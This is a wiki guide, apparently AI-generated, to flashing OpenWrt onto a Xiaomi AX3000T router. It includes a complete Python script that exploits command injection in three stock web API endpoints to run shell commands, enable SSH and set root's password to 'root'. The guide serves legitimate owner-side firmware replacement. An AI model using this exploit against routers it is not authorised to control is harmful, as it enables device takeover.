---
type: guide
title: 'Xiaomi Mi Router AX3000T: OpenWrt flashing guide'
description: Hardware specs and how to flash OpenWrt onto a Xiaomi Mi Router AX3000T from stock firmware via a web API command-injection exploit, plus later sysupgrade updates.
tags: [openwrt, router, xiaomi, ax3000t, hardware, flashing]
status: draft
resource:
created: 2026-09-28T17:04:00Z
updated: 2026-09-28T17:04:00Z
generated:
  by: claude/sonnet-5
  at: 2026-09-28T17:04:00Z
verified: []
stale_after: 2027-09-28T17:04:00Z
sources:
- id: 2026-09-28-openwrt-device-model-docs
  resource: 'private:/sources/network/access-points/2026-09-28-openwrt-device-model-docs.md'
relations: []
superseded_by:
---

# Xiaomi Mi Router AX3000T: OpenWrt flashing guide

Budget dual-band WiFi 6 router built around MediaTek's filogic (MT7981B) platform. Officially
supported by OpenWrt since release 24.10, and a common cheap target for a full OpenWrt/DSA-based
router thanks to its 4 Gigabit ports and reasonable flash/RAM headroom.

## Hardware specifications

| Property | Value |
|---|---|
| SoC | MediaTek MT7981B (filogic) |
| CPU | 2x ARM Cortex-A53 (aarch64), ~1.3GHz |
| RAM | 256MB |
| Flash | 128MB NAND (ESMT F50L1G41LB, Winbond W25N01KV, or Foresee F35SQA001G — varies by unit) |
| Ethernet | 4x Gigabit (1x WAN + 3x LAN), DSA-based (no `swconfig`) |
| Switch chip | MediaTek MT7531AE or Airoha AN8855 (varies by unit; both supported OpenWrt 24.10+) |
| WiFi | MediaTek MT7976C, dual-band WiFi 6 (2.4GHz + 5GHz), 2 radios (`phy0`/`phy1`) |
| OpenWrt target | `mediatek/filogic` |
| OpenWrt support since | 24.10 |

Specs confirmed live from a flashed unit (`cat /proc/cpuinfo`, `free -m`, `ls /sys/class/net`,
`iw list`).

### Hardware revisions

There are three known board revisions. Check the barcode on the box/router bottom **before** doing
anything:

| Revision | Notes |
|---|---|
| RD03 | Chinese domestic variant. Supported. |
| RD23 | International/global variant, identical hardware to RD03. Supported. |
| RD03v2 | Different (Qualcomm) SoC entirely. **Not supported** by OpenWrt. |

RD03v2 identifiers to watch for: barcode ending in `706330`, or SKU `DVB4510CN`. If either matches,
stop — none of the flashing steps below apply.

> **Do not attempt to flash a RD03v2 unit with images from this page.** It runs a different
> (Qualcomm) SoC than RD03/RD23 — OpenWrt images built for `mediatek/filogic` will not boot on it
> and there is no known OpenWrt support for RD03v2 at all. Check the barcode/SKU above before
> proceeding.

## Default network

| | Stock firmware | OpenWrt (post-flash) |
|---|---|---|
| Web UI / router IP | `192.168.31.1` | `192.168.1.1` |  <!-- wiki:allow -->
| LAN subnet | `192.168.31.0/24` | — |  <!-- wiki:allow -->
| Root password | — | none set on first boot — set one immediately (`passwd` over SSH or via LuCI) |
| WiFi | — | disabled by default until configured |

### MTD partition layout (stock bootloader)

Confirmed on an RD23 unit — useful reference when backing up or troubleshooting:

| mtd | name | size | purpose |
|---|---|---|---|
| 0 | spi0.0 | 128MB | raw flash device |
| 1 | BL2 | 1MB | second-stage bootloader |
| 2 | Nvram | 256KB | |
| 3 | Bdata | 256KB | board data |
| 4 | Factory | 2MB | factory calibration data |
| 5 | FIP | 2MB | Firmware Image Package |
| 6 | crash | 256KB | |
| 7 | crash_log | 256KB | |
| 8 | ubi | 34MB | firmware slot A |
| 9 | ubi1 | 34MB | firmware slot B |
| 10 | overlay | 32MB | |
| 11 | data | 12MB | |
| 12 | KF | 256KB | |

The stock firmware is dual-slot (A/B, `firmware=0`/`firmware=1` in `/proc/cmdline`) — see below for
which slot to target.

## Steps

### Prerequisites

- Router still on stock Xiaomi firmware, reachable at `192.168.31.1`.  <!-- wiki:allow -->
- Your PC on the same LAN/subnet as the router (plugged into a LAN port, not WAN).
- The router's **admin web password** (the one used to log into the stock web UI).
- Windows: [PuTTY](https://www.putty.org/) (`plink`/`pscp`) — the stock firmware's dropbear has no
  SFTP server, so OpenSSH's `scp` needs `-O`, and its `ssh-rsa` host key is rejected by modern
  OpenSSH/paramiko; `plink`/`pscp` handle both without extra flags.
- Python 3 with `requests` installed (`pip install requests`).

### 1. Enable SSH via the API RCE exploit

Xiaomi's stock firmware has a web API command-injection vulnerability. The exact injection endpoint
that works depends on firmware version and patch level — newer firmware may have some (but not
all) of the vulnerable endpoints closed. The script below tries `start_binding`, `arn_switch`, and
`set_mac_filter` in turn and verifies which one actually achieves code execution (by writing a
value into a diagnostic UCI field via the injected shell and reading it back — a plain `"code":0`
HTTP response does **not** by itself prove the command ran).

Save as `xiaomi_exploit.py`, set `IP` / `WEB_PASS`, and run with `py xiaomi_exploit.py`:

```python
#!/usr/bin/env python3
import hashlib, random, re, sys, time
import requests

IP = "192.168.31.1"  # wiki:allow
WEB_PASS = "<your-admin-password>"

session = requests.Session()
session.headers["User-Agent"] = "curl/8.4.0"

def api_request(path, params=None, stok=None, post=True, timeout=4):
    url = f"http://{IP}/cgi-bin/luci/;stok={stok}/{path}" if stok else f"http://{IP}/cgi-bin/luci/{path}"
    if post:
        return session.post(url, data=params, timeout=timeout,
                             headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
    return session.get(url, params=params, timeout=timeout)

r = session.get(f"http://{IP}/cgi-bin/luci/web", timeout=6)
page = r.text
mac_address = re.search(r"var deviceId = '(.*?)'", page).group(1)
nonce_key = re.search(r"key: '(.*)',", page).group(1)

def xqhash(s: bytes, mode=0):
    return hashlib.sha1(s).hexdigest() if mode == 0 else hashlib.sha256(s).hexdigest()

def web_login(mode):
    nonce = f"0_{mac_address}_{int(time.time())}_{random.randint(1000,10000)}"
    account_str = xqhash((WEB_PASS + nonce_key).encode(), mode)
    password = xqhash((nonce + account_str).encode(), mode)  # wiki:allow (computed hash, not a stored credential)
    data = f"username=admin&password={password}&logtype=2&nonce={nonce}"
    return api_request("api/xqsystem/login", data).text

text = next((t for m in (0, 1) if (t := web_login(m)) and '"token"' in t), None)
if not text:
    sys.exit("LOGIN FAILED")
stok = re.findall(r'"token":"(.*?)"', text)[0]
print(f"Got stok={stok}")

def set_iperf_thr(v):
    p = {"iperf_test_thr": str(v), "usb_read_thr": "0", "usb_write_thr": "0", "disk_read_thr": "0", "disk_write_thr": "0"}
    return api_request("api/xqnetwork/diag_set_paras", p, stok=stok).json().get("code")

def get_iperf_thr():
    return str(api_request("api/xqnetwork/diag_get_paras", stok=stok, post=False).json().get("iperf_test_thr"))

def exploit_start_binding(cmd):
    cmd = cmd.replace(";", "\n")
    params = {"uid": 1234, "key": "1234' -X \n" + cmd + "\n logger -t X 'X"}
    try:
        return api_request("api/xqsystem/start_binding", params, stok=stok, timeout=1.5).text
    except requests.exceptions.ReadTimeout:
        return ""

def exploit_arn_switch(cmd):
    cmd = cmd.replace(";", "\n")
    params = {"open": 0, "mode": 1, "level": "\n" + cmd + "\n"}
    r = api_request("api/misystem/arn_switch", params, stok=stok)
    time.sleep(0.5)
    return r.text

def exploit_set_mac_filter(cmd):
    for action, option in {"add": 0, "del": 1}.items():
        time.sleep(0.05)
        time_ms = int(time.time() * 1000)
        name = f"xxx ; uci set diag.config.usb_read_thr={time_ms} ; uci commit diag ; " + cmd
        params = {"mac": "00:00:00:00:00:33", "name": name, "option": option, "wan": ""}
        try:
            res = api_request("api/xqsystem/set_mac_filter", params, stok=stok, timeout=2).text
        except requests.exceptions.ReadTimeout:
            res = ""
        if not res or '"code":0' not in res:
            return ""
        diag = api_request("api/xqnetwork/diag_get_paras", stok=stok, post=False, timeout=2).json()
        if str(diag.get("usb_read_thr")) == str(time_ms):
            return res
    return ""

set_iperf_thr(20)
exec_cmd = None
for idx, (name, fn) in enumerate([("start_binding", exploit_start_binding),
                                   ("arn_switch", exploit_arn_switch),
                                   ("set_mac_filter", exploit_set_mac_filter)]):
    test_num = 82000011 + idx
    fn(f"uci set diag.config.iperf_test_thr={test_num} ; uci commit diag")
    if get_iperf_thr() == str(test_num):
        exec_cmd = fn
        print(f"Exploit '{name}' works")
        break
    time.sleep(0.5)
set_iperf_thr(20)

if not exec_cmd:
    sys.exit("No exploit worked — firmware may be fully patched (needs the get_icon variant instead)")

exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
exec_cmd(r"echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
exec_cmd(r"/etc/init.d/dropbear enable")
exec_cmd(r"/etc/init.d/dropbear restart")
print("SSH enabled — root/root on port 22")
```

> Credit: exploit logic adapted from
> [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher), reimplemented
> standalone here since the original tool bundles a Python 3.8-only compiled `ssh2` module.

### 2. Connect via SSH

The stock dropbear's host key uses raw `ssh-rsa`, which recent OpenSSH/paramiko versions refuse by
default. Use `plink`:

```powershell
plink -ssh -batch -pw root root@192.168.31.1 "cat /proc/mtd"  # wiki:allow
```

First connection will show a host-key prompt/fingerprint (or fail in `-batch` mode asking to
confirm) — grab the fingerprint from the error output and pass it explicitly:

```powershell
plink -ssh -batch -pw root -hostkey "<fingerprint-from-above>" root@192.168.31.1 "echo ok"  # wiki:allow
```

### 3. Back up stock partitions

**Do not skip this.** It's the only way back to stock firmware if something goes wrong.

```powershell
$HK = "<fingerprint>"
plink -ssh -batch -pw root -hostkey $HK root@192.168.31.1 "nanddump -f /tmp/BL2.bin /dev/mtd1 && nanddump -f /tmp/Nvram.bin /dev/mtd2 && nanddump -f /tmp/Bdata.bin /dev/mtd3 && nanddump -f /tmp/Factory.bin /dev/mtd4 && nanddump -f /tmp/FIP.bin /dev/mtd5 && nanddump -f /tmp/ubi.bin /dev/mtd8 && nanddump -f /tmp/KF.bin /dev/mtd12"  # wiki:allow

foreach ($f in "BL2.bin","Nvram.bin","Bdata.bin","Factory.bin","FIP.bin","ubi.bin","KF.bin") {
    pscp -scp -pw root -hostkey $HK root@192.168.31.1:/tmp/$f .  # wiki:allow
}
```

See the [MTD partition layout](#mtd-partition-layout-stock-bootloader) table above for which
partitions these are.

### 4. Determine the active firmware slot

```powershell
plink -ssh -batch -pw root -hostkey $HK root@192.168.31.1 "cat /proc/cmdline"  # wiki:allow
```

- `firmware=0` in the output → flash target is `/dev/mtd9`
- `firmware=1` → flash target is `/dev/mtd8`

### 5. Flash the OpenWrt initramfs

Grab `<version>-mediatek-filogic-xiaomi_mi-router-ax3000t-initramfs-factory.ubi` (non-`ubootmod`
variant — this keeps the stock U-Boot bootloader) from the
[OpenWrt downloads page](https://downloads.openwrt.org/releases/), verify its `sha256sums` entry,
then upload and flash:

```powershell
pscp -scp -pw root -hostkey $HK openwrt-*-initramfs-factory.ubi root@192.168.31.1:/tmp/openwrt-initramfs-factory.ubi  # wiki:allow

# for firmware=0 -> mtd9 (swap to mtd8 + flag values below if firmware=1)
plink -ssh -batch -pw root -hostkey $HK root@192.168.31.1 "ubiformat /dev/mtd9 -y -f /tmp/openwrt-initramfs-factory.ubi"  # wiki:allow

plink -ssh -batch -pw root -hostkey $HK root@192.168.31.1 "nvram set boot_wait=on && nvram set uart_en=1 && nvram set flag_boot_rootfs=1 && nvram set flag_last_success=1 && nvram set flag_boot_success=1 && nvram set flag_try_sys1_failed=0 && nvram set flag_try_sys2_failed=0 && nvram commit && reboot"  # wiki:allow
```

> If flashing `mtd8` instead (firmware=1 case), set `flag_boot_rootfs=0` and `flag_last_success=0`.

The router reboots into OpenWrt initramfs (temporary, RAM-only) on the default OpenWrt LAN address
`192.168.1.1`. Wait ~30-60s, then it should respond to ping/HTTP there. No DHCP renewal needed on  <!-- wiki:allow -->
Windows — the link bounce on reboot normally triggers one automatically.

### 6. Make it permanent

```powershell
ssh -o StrictHostKeyChecking=no root@192.168.1.1 "echo ok"   # accept new host key  # wiki:allow
scp -O -o StrictHostKeyChecking=no openwrt-*-squashfs-sysupgrade.bin root@192.168.1.1:/tmp/sysupgrade.bin  # wiki:allow
ssh -o StrictHostKeyChecking=no root@192.168.1.1 "sysupgrade -n /tmp/sysupgrade.bin"  # wiki:allow
```

The SSH session drops as soon as `sysupgrade` starts flashing — that's normal, not a failure. Wait
for `192.168.1.1` to respond again (another 30-60s), then confirm:  <!-- wiki:allow -->

```powershell
ssh -o StrictHostKeyChecking=no root@192.168.1.1 "cat /etc/openwrt_release"  # wiki:allow
```

**Immediately set a root password** (`passwd` over SSH, or via LuCI at `http://192.168.1.1`) —  <!-- wiki:allow -->
right after install there is none, so anyone on the LAN has unauthenticated root.

## Later OpenWrt version upgrades

Once OpenWrt is installed, version upgrades are just a normal `sysupgrade` — no exploit needed
anymore:

```powershell
scp -O -o StrictHostKeyChecking=no openwrt-<new-version>-mediatek-filogic-xiaomi_mi-router-ax3000t-squashfs-sysupgrade.bin root@192.168.1.1:/tmp/sysupgrade.bin  # wiki:allow
ssh -o StrictHostKeyChecking=no root@192.168.1.1 "sysupgrade /tmp/sysupgrade.bin"  # wiki:allow
```

Omit `-n` to keep the existing config (safe for a same-major-version bump, or when config is still
close to default). Check `sha256sums` on the
[downloads page](https://downloads.openwrt.org/releases/) before flashing, as always.

## Verify

```sh
cat /etc/openwrt_release
ubus call system board
```

## Troubleshooting

- **`ash: /usr/libexec/sftp-server: not found`** when using `scp`/`pscp` — the minimal firmware has
  no SFTP server. Use `pscp -scp` (PuTTY) or `scp -O` (OpenSSH ≥9, forces the legacy SCP protocol).
- **`Incompatible ssh peer (no acceptable host key)`** (paramiko) or **`Password authentication is
  disabled`** (OpenSSH) — the stock dropbear only offers `ssh-rsa`, which modern clients reject by
  default. Use `plink`/`pscp` instead, they still support it.
- **`REMOTE HOST IDENTIFICATION HAS CHANGED`** — expected the first time you connect after flashing
  (new SSH daemon = new host key on the same IP). Confirmed not a MITM if it immediately follows a
  flash/reboot you just did yourself. Remove the stale entry: `ssh-keygen -R <ip>`.
- **None of the three exploits work** — the firmware may have all three closed; check the
  [OpenWrt forum thread](https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490) for
  the newer `get_icon`-based exploit variant, which changes per firmware version.

## Related

<None yet.>

## Sources

- [OpenWrt Table of Hardware: Xiaomi AX3000T](https://openwrt.org/toh/xiaomi/ax3000t)
- [OpenWrt firmware selector — AX3000T](https://firmware-selector.openwrt.org/?target=mediatek%2Ffilogic&id=xiaomi_mi-router-ax3000t)
- [OpenWrt forum: support thread for AX3000T](https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490)
- [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) (original exploit tooling)
- [Legacy wiki.js: OpenWrt AP hardware device model pages](../../../../../sources/network/access-points/2026-09-28-openwrt-device-model-docs.md)
